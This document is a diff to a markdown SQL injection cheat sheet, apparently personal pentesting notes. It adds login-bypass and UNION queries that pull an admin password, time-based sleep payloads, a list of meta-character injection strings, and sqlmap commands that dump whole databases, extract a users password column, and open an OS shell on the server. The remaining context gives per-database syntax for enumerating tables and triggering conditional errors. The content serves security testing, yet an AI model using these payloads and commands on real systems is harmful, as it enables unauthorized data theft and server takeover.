@@ -1,6 +1,70 @@
-SQL injection cheat sheet
+# SQL Injection 
+A SQL injection is an attack in which the attacker executes arbitrary SQL
+commands on an application’s database by supplying malicious input inserted into a SQL statement.
 
-String concatenation
+# Injecting Code into SQL Queries
+A SQL injection attack occurs when an attacker is able to inject code into the
+SQL statements that the target web application uses to access its database,
+thereby executing whatever SQL code the attacker wishes.
+
+# Sample Queries
+SELECT id FROM users WHERE username='admin';-- ' AND Password='password123';
+The -- sequence denotes the start of a SQL comment, which doesn’t get interpreted as code, 
+so by adding -- into the username part of the query, the attacker effectively comments out the rest of the SQL query. 
+The query becomes this: SELECT id FROM users WHERE username='admin';
+
+
+    SELECT title, body FROM emails 
+    WHERE username='vickie' 
+    AND accesskey='ZB6w0YLjzvAVmp6zvr'
+    UNION SELECT 1,
+    CONVERT((SELECT password FROM users WHERE username="admin"), DATE);--
+
+    ' or sleep(15) and 1=1#
+    ' or sleep(15)#
+    ' union select sleep(15),null#
+
+Meta Characters
+
+    '
+    ''
+    ;%00
+    --
+    -- -
+    ""
+    ;
+    ' OR '1
+    ' OR 1 -- -
+    " OR "" = "
+    " OR 1 = 1 -- -
+    ' OR '' = '
+    OR 1=1
+
+# Reports 
+[Orange's SQL Injection on Uber](https://hackerone.com/reports/150156/)
+
+# SQLMap 
+1 Saved burp req
+2 sqlmap -r 
+-r = path to saved req
+-p = parameter to test for 
+
+> sqlmap -r /home/hapihacker/burprequest1 -p vuln-param –dump-all
+
+If you’re not interested in dumping the entire database, you could use
+the --dump command to specify the exact table and columns you would like:
+> sqlmap -r /home/hapihacker/burprequest1 -p vuln-param –dump -T users -C password -D helpdesk
+
+Sometimes SQL injection vulnerabilities will allow you to upload a web
+shell to the server that can then be executed to obtain system access. You
+could use one of SQLmap’s commands to automatically attempt to upload a
+web shell and execute the shell to grant you with system access:
+> sqlmap -r /home/hapihacker/burprequest1 -p vuln-param –os-shell
+
+
+# SQL injection cheat sheet
+
+## String concatenation
 ====================
 Oracle 	        'foo'||'bar'
 Microsoft 	    'foo'+'bar'
@@ -8,27 +72,27 @@ PostgreSQL 	    'foo'||'bar' and 'foo' 'bar' [Note the space between the two str
 MySQL 	        CONCAT('foo','bar')
 
 
-Substring
+## Substring
 ====================
 Each of the following expressions will return the string ba.
 Oracle 	SUBSTR('foobar', 4, 2)
 Microsoft, PostgreSQL, MySQL 	SUBSTRING('foobar', 4, 2)
 
-Comments
+## Comments
 ====================
 Oracle     	--comment
 Microsoft	--comment or /*comment*/
 PostgreSQL 	--comment or /*comment*/ or  #comment
 MySQL 	    -- comment [Note the space after the double dash] or /*comment*/
 
-Database version
+## Database version
 ====================
 Oracle 	    SELECT banner FROM v$version or SELECT version FROM v$instance
 Microsoft 	SELECT @@version
 PostgreSQL 	SELECT version()
 MySQL 	    SELECT @@version
 
-Database contents
+## Database contents
 ====================
 You can list the tables that exist in the database, and the columns that those tables contain.
 Oracle 	        SELECT * FROM all_tables or SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
@@ -37,7 +101,7 @@ Microsoft, PostgreSQL, MySQL
 SELECT * FROM information_schema.tables or SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
 
 
-Conditional errors
+## Conditional errors
 ====================
 You can test a single boolean condition and trigger a database error if the condition is true.
 Oracle 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
